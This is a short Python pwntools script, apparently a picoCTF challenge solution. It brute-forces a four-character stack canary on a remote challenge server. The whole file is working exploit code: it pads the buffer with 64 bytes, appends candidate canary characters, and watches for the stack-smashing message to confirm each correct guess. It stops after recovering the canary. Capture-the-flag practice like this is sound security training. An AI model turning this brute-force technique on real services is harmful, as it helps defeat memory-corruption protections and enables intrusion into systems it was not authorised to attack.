from pwn import *
import string

elf = context.binary = ELF('./vuln', checksec=False)
context.log_level = 'critical'

canary = ""

while len(canary) < 4:
    not_found = True
    while not_found:
        for i in string.printable:
            # p = elf.process()
            p = remote('saturn.picoctf.net', 63681)
            padding = 64

            test = canary + i
            print(test)
            payload = b'A' * padding
            payload += f'{test}'.encode()

            p.sendlineafter(b'>', str(len(payload)).encode())

            p.sendlineafter(b'>', payload)

            if b'Smashing' in p.recvline():
                p.close()
                continue
            else:
                canary += i
                not_found = False
                p.close()
                break
